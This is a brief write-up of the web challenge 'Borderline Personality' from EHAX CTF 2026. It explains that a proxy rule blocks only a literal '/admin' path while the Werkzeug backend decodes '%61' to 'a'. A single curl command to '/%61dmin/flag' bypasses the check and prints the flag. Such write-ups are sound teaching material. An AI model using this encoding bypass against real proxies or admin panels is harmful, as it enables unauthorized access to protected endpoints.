# Borderline Personality — EHAX CTF 2026

> **Room / Challenge:** Borderline Personality (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** EHAX CTF 2026
- **Challenge:** Borderline Personality (Web)
- **Target / URL:** `http://chall.ehax.in:9098/`
- **Points:** `50`
- **Date:** `01-03-2026`

---

## My Solution

The blind spot in the proxy is here `^/+admin`, the proxy just checks for `/admin`, and also the backend uses Werkzeug library so when we sent something like this `%61` encoding for ASCII letter `a`. Combining these two we use this command to get the flag:

```bash
curl http://chall.ehax.in:9098/%61dmin/flag
```

Got

```bash
> curl http://chall.ehax.in:9098/%61dmin/flag

EH4X{BYP4SSING_R3QU3S7S_7HR0UGH_SMUGGLING__IS_H4RD}
```
